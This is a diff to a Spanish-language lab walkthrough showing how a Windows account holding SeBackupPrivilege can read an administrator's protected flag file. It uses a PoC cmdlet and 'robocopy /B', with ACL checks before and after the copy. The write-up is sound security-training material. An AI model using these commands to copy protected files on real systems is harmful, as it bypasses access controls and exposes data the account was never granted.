@@ -448,6 +448,24 @@ cat C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt
 
 Como era de esperar, tenemos acceso denegado.
 
+Visualizamos el propietario:
+```powershell
+Get-ChildItem -Path 'C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name='Owner';Expression={ (Get-Acl $_.FullName).Owner }}
+```
+<img width="1016" height="230" alt="image" src="https://github.com/user-attachments/assets/3dd34418-629d-4364-ab1c-62a1bfac76e5" />
+
+El propietario es `BUILTIN\Administrators`
+
+Si visualizamos la lista de permisos:
+
+```powershell
+(Get-Acl C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt).Access
+```
+
+<img width="1033" height="453" alt="image" src="https://github.com/user-attachments/assets/756df773-f6fb-4f64-9010-61c0c392ad2e" />
+
+No tenemos permisos sobre el archivo.
+
 Utilizamos la `PoC` para realizar una copia con sintaxis de backup:
 ```powershell
 Copy-FileSeBackupPrivilege 'C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt
@@ -461,5 +479,21 @@ Una vez copiado el fichero, obtenemos la flag leyendolo:
 
 También podríamos haber usado `Robocopy`:
 ```powershell
-robocopy /B C:\Users\Administrator\Desktop\SeBackupPrivilege\ flag2 flag2.txt
+robocopy /B C:\Users\Administrator\Desktop\SeBackupPrivilege\ .\flag2\ flag.txt
 ```
+
+<img width="1033" height="146" alt="image" src="https://github.com/user-attachments/assets/4569389c-96b1-4d7a-a557-2eb62ae75e4f" />
+
+
+Si visualizamos el propietario y los permisos:
+
+```powershell
+Get-ChildItem -Path '.\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name='Owner';Expression={ (Get-Acl $_.FullName).Owner }}
+```
+```powershell
+(Get-Acl .\flag.txt).Access
+```
+
+<img width="1012" height="608" alt="image" src="https://github.com/user-attachments/assets/ee443242-84a6-463d-9ee0-2ea924f246be" />
+
+Obtenemos que el propietario es `INLANEFREIGHT\svc_backup` y tenemos `FullControl` sobre el fichero. Lo cual tiene sentido porque los comandos de copia permiten crear un archivo bajo nuestra propiedad con la copia del archivo original, aprovechandose del `SeBackupPrivilege` bajo sintaxis backup.
